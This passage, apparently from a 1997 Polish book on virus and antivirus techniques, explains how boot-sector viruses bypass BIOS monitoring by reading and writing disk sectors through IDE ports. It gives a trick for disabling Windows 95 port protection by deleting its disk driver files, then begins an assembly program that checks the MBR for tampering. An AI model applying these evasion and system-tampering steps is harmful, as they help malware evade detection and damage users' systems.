\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na du\uc1\u380\'bfo ni\uc1\u380\'bfszym poziomie operuj\uc1\u261\'b9 wirusy infekuj\uc1\u261\'b9ce G\uc1\u322\'b3\'f3wny Rekord \uc1\u321\'a3aduj\uc1\u261\'b9cy (MBR), BOOT-sektory i JAP. Korzystaj\uc1\u261\'b9 one z przerwania programowego INT 13h, operuj\uc1\u261\'b9cego bezpo\uc1\u347\'9crednio na fizycznych sektorach dysk\'f3w (w przypadku dyskietek mo\uc1\u380\'bfna u\uc1\u380\'bfy\uc1\u263\'e6 przerwania 40h). Tak ja}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0} w przypadku przerwa\uc1\u324\'f1 i funkcji DOS, funkcje BIOS mog\uc1\u261\'b9 by\uc1\u263\'e6 do\uc1\u347\'9c\uc1\u263\'e6 \uc1\u322\'b3atwo monitorowane przez program antywirusowy, a w nowoczesnych BIOS-ach - nawet przez program obs\uc1\u322\'b3ugi przerwania. W takim wypadku pozostaje jedyna bezpieczna metoda ingerencji w zawarto\uc1\u347\'9c\uc1\u263\'e6 se}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0}tor\'f3w, polegaj\uc1\u261\'b9ca na u\uc1\u380\'bfyciu bezpo\uc1\u347\'9crednich odwo\uc1\u322\'b3a\uc1\u324\'f1 do port\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pisanie procedur do obs\uc1\u322\'b3ugi plik\'f3w, kt\'f3re na najni\uc1\u380\'bfszym poziomie odwo\uc1\u322\'b3ywa\uc1\u322\'b3yby si\uc1\u281\'ea do port\'f3w nie ma sensu, natomiast \uc1\u322\'b3atwo jest napisa\uc1\u263\'e6 takie procedury tylko dla pojedynczych, wybranych sektor\'f3w, czyli np. MBR, BOOT-sektora, co w przypadku dysk\'f3w (zgodnych z IDE lub EIDE) oraz dyskietek jest wzgl\uc1\u281\'eadnie proste. W przypadku dysk\'f3w SCSI jest to o wiele trudniejsze, chocia\uc1\u380\'bfby ze wzgl\uc1\u281\'eadu na brak dok\uc1\u322\'b3adnej dokumentacji technicznej tych urz\uc1\u261\'b9dze\uc1\u324\'f1, st\uc1\u261\'b9d te\uc1\u380\'bf}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}trzeba obs\uc1\u322\'b3ugiwa\uc1\u263\'e6 je przez funkcje systemowe (mo\uc1\u380\'bfna pokusi\uc1\u263\'e6 si\uc1\u281\'ea o poszukanie czystych wej\uc1\u347\'9c\uc1\u263\'e6 do procedur ich obs\uc1\u322\'b3ugi).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Operuj\uc1\u261\'b9c na portach nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf wraz z pojawieniem si\uc1\u281\'ea dysk\'f3w o pojemno\uc1\u347\'9cciach o wiele wi\uc1\u281\'eakszych od tych, kt\'f3re mog\uc1\u261\'b9 by\uc1\u263\'e6 standardowo obs\uc1\u322\'b3ugiwane przez funkcje BIOS przerwania 13h, zasz\uc1\u322\'b3a konieczno\uc1\u347\'9c\uc1\u263\'e6 jakiego\uc1\u347\'9c obej\uc1\u347\'9ccia dotychczasowych ogranicze\uc1\u324\'f1 zwi\uc1\u261\'b9zanych z pojemno\uc1\u347\'9cci\uc1\u261\'b9 dysk\'f3w widzianych przez BIOS. Niekt\'f3re twarde dyski posiadaj\uc1\u261\'b9 wi\uc1\u281\'eac w swych pierwszych fizycznych sektorach (pocz\uc1\u261\'b9wszy}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}od MBR) co\uc1\u347\'9c w rodzaju nak\uc1\u322\'b3adki (ang. Dynamic Drive Overlay), kt\'f3ra po za\uc1\u322\'b3adowaniu do pami\uc1\u281\'eaci przez program zawarty w pierwszym fizycznym sektorze przejmuje i poszerza odpowiednie funkcje obs\uc1\u322\'b3ugi dysku. Aby mo\uc1\u380\'bfliwe by\uc1\u322\'b3o dalsze wczytywanie systemu, po wczyt}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}niu nak\uc1\u322\'b3adki odwo\uc1\u322\'b3ania do sektor\'f3w s\uc1\u261\'b9 przekierowy-wane (do numeru cylindra dodawane jest l). W efekcie prawdziwy sektor MBR wcale nie jest umiejscowiony w sektorze o adresie: cylinder 0, strona 0, sektor l, lecz pod adresem: cylinder l, strona 0, sektor l}{\f1\fs24\lang1045{\*\listtag0}.}{\f0\fs24\lang1045{\*\listtag0} Nieuwzgl\uc1\u281\'eadnienie tego faktu mo\uc1\u380\'bfe przyczyni\uc1\u263\'e6 si\uc1\u281\'ea do przypadkowego zniszczenia danych na dysku podczas zapisywania przy u\uc1\u380\'bfyciu port\'f3w, a co za tym idzie, do szybszego wykrycia wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najskuteczniejszym sposobem uchronienia si\uc1\u281\'ea przed odczytem i zapisem bezpo\uc1\u347\'9crednio przez porty jest odpowiednia kontrola dost\uc1\u281\'eapu do urz\uc1\u261\'b9dze\uc1\u324\'f1 we/wy na poziomie trybu chronionego przy pomocy tablic map portu. Jednak i to zabezpieczenie nie wydaje si\uc1\u281\'ea bardzo pewne, gdy\uc1\u380\'bf najcz\uc1\u281\'ea\uc1\u347\'9cciej istnieje jaka\uc1\u347\'9c mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 ingerencji w j\uc1\u261\'b9dro syste}{\f1\fs24\lang1045{\*\listtag0}m}{\f0\fs24\lang1045{\*\listtag0}u nawet dla trybu chronionego (je\uc1\u380\'bfeli nie w pami\uc1\u281\'eaci, to w plikach), a co za tym idzie, mo\uc1\u380\'bfna zmieni\uc1\u263\'e6 odpowiedni\uc1\u261\'b9 cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 systemu, odpowiedzialn\uc1\u261\'b9 w tym wypadku za operacje na dyskach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku systemu Windows 95 (dzia\uc1\u322\'b3aj\uc1\u261\'b9cego w trybie chronionym) mo\uc1\u380\'bfna spr\'f3bowa\uc1\u263\'e6 wymusza\uc1\u263\'e6 jego uruchamianie w tzw. trybie zgodno\uc1\u347\'9cci z MS DOS. Tryb ten oznacza, i\uc1\u380\'bf wszelkie wykonywane operacje dyskowe s\uc1\u261\'b9 przekierowywane do trybu rzeczywistego, a tam nie dzia\uc1\u322\'b3a mechanizm ochrony port\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby wymusi\uc1\u263\'e6 u\uc1\u380\'bfywanie tego trybu przez Windows 95, nale\uc1\u380\'bfy skasowa\uc1\u263\'e6 lub tymczasowo usun\uc1\u261\'b9\uc1\u263\'e6 nast\uc1\u281\'eapuj\uc1\u261\'b9ce pliki:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > \uc1\u347\'9cciezka\\SYSTEM\\IOSUBSYS\\HSFLOP.PDR - plik odpowiedzialny za dyski FDD;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > \uc1\u347\'9ccie\uc1\u378\'9fka\\SYSTEM\\IOSUBSYS\\ESDI_506.PDR - plik odpowiedzialny za dyski twarde zgodne z (E)IDE;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > \uc1\u347\'9ccie\uc1\u380\'bfka\\SYSTEM\\IOSUBSYS\\}{\f1\fs24\lang1045{\*\listtag0}SCSIPORT.PDR - plik odpowiedzialny za dyski twarde SCSI,}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch gdzie \uc1\u347\'9ccie\uc1\u380\'bfka oznacza katalog, w kt\'f3rym umieszczony jest system Windows. Zastosowanie tego triku spowoduje, i\uc1\u380\'bf przy nast\uc1\u281\'eapnym \uc1\u322\'b3adowaniu systemu Windowa zostanie on uruchomiony w trybie zgodno\uc1\u347\'9cci z MS}{\f1\fs24\lang1045{\*\listtag0} DOS.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Odnalezienie katalogu, w kt\'f3rym umieszczony jest system Windows, nie stanowi problemu. Wystarczy w bloku pami\uc1\u281\'eaci nale\uc1\u380\'bf\uc1\u261\'b9cym do \uc1\u347\'9crodowiska (ang. enviroment) odnale\uc1\u378\'9f\uc1\u263\'e6 jedn\uc1\u261\'b9 ze zmiennych (nie zawsze wyst\uc1\u281\'eapuj\uc1\u261\'b9 wszystkie):}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > WIN=;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > WINDIR=;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > WINBOOTDIR=}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch i odczyta\uc1\u263\'e6 opisywany przez dan\uc1\u261\'b9 zmienn\uc1\u261\'b9 katalog, a nast\uc1\u281\'eapnie ju\uc1\u380\'bf bez trudu uzyska\uc1\u263\'e6 dost\uc1\u281\'eap do plik\'f3w *.PDR.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej zamieszczono dwa programy, z kt\'f3rych jeden odczytuje przy pomocy port\'f3w tablic\uc1\u281\'ea partycji pierwszego dysku twardego, a drugi BOOT-sektor dyskietki (musi by\uc1\u263\'e6 w nap\uc1\u281\'eadzie). Odczytane sektory s\uc1\u261\'b9 por\'f3wnywane z zawarto\uc1\u347\'9cci\uc1\u261\'b9 sektor\'f3w widzianych przez funkcje BIOS, za\uc1\u347\'9c wynik por\'f3wnania jest wy\uc1\u347\'9cwietlany na ekranie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  IDE_PORT v1.0, Autor : Adam Blaszczyk 1997                      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Program odczytuje sektor tablicy partycji pierwszego twardego dysku  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       przez porty IDE i przerwanie BIOS, a nastepnie tak odczytane sektory ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       porownuje ze soba.                                                   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Umozliwia wiec sprawdzenie, czy odczyty BIOSa nie sa zafalszowane    ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       przez jakiegos wirusa.                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; UWAGA : Odczyt przez porty dziala tylko dla dyskow zgodnych z IDE lub EIDE ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;         i nie dziala w systemie Windows'95                                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM  /t IDE_PORT.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK IDE_PORT.OBJ                                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IDE_PORT SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS:IDE_PORT, DS:IDE_PORT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   NUL = 00h                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   LF  = 0Ah                       ;  - stale potrzebne do deklaracji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   CR  = 0Dh                       ; /  lancuchow napisowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    si,TeCopyRight     ; \\ wyswietl info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         Call   Druk               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    ax,1600h           ; sprawdz, czy praca w systemie Windows ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         int    2Fh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         test   al,7Fh             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jz     NieMaWindows       ; ZF=0 - nie ma Windows}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         cmp    al,4               ; czy wersja Windows < 4.0 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jb     NieMaWindows       ; TAK - to nie Windows 95}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                   ; NIE - to Windows 95}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    bp,TeWindows95     ; \\ program nie dziala pod Windows 95}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jmp    Rozne              ; / wiec koncz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaWindows:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    dx,1F2h            ; 1F2 - okresla ile sektorow czytac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    al,00000001b       ; czytaj 1 sektor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         out    dx,al              ; wyslij do IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         inc    dx                 ; 1F3 - okresla, ktory sektor pierwszy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    al,00000001b       ; czytaj sektor nr 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         out    dx,al              ; wyslij do IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         inc    dx                 ; 1F4 - starsza czesc cylindra (bity 0-1)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    al,00000000b       ; czytaj cylinder 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         out    dx,al              ; wyslij do IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         inc    dx                 ; 1F5 - mlodsza czesc cylindra (bity 0-7)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    al,00000000b       ; czytaj cylinder 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         out    dx,al              ; wyslij do IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         inc    dx                 ; 1F6 - nr dysku + nr glowicy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    al,10100000b       ; 101NGggg, N=0=master/1=slave, Gggg - glowica}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         out    dx,al              ; wyslij do IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         inc    dx                 ; 1F7 - rejestr rozkazowy IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    al,00100000b       ; rozkaz odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         out    dx,al              ; wyslij do IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    bp,TeIDENieDziala  ; odczyt przez porty nie dziala}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    cx,0FFFFh          ; tyle razy odczytuj z portu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzekajNaDane:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         in     al,dx              ; czekaj na dane z kontrolera IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         test   al,00001000b       ; bit 3 ustawiony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         loopz  CzekajNaDane       ; TAK - mozna czytac, NIE - czekaj dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         test   al,00001000b       ; bit 3 ustawiony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jz     Rozne              ; NIE - jakis blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    cx,256             ; 256x2 bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    di,SektorIDE       ; gdzie zapisac dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    dx,1F0h            ; 1F0 - port danych IDE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         cld                       ; INC DI w operacjach lancuchowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytajSektor:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         in     ax,dx              ; czytaj slowo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         stosw                     ; zachowaj je}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         loop   CzytajSektor       ; czytaj 256 slow=512 bajtow sektora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
